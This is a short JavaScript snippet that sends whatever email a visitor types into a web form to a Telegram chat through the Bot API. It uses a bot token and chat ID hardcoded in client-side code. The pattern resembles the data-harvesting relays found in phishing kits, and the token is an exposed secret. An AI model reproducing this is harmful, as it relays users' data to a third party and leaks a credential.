	document.querySelector('.info-btn').onclick = function(){
	let email = '<Email:> '+ (document.querySelector('.email-info').value)+'     ';
	var token = '1082381907:AAFGyu6URAZk_yc-i6sM8yVPDeBvj3r_KHk';
	const url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id=-340898761&text=';
	let xhttp = new XMLHttpRequest();
	xhttp.open("GET", url + email, true);
	xhttp.send();
}


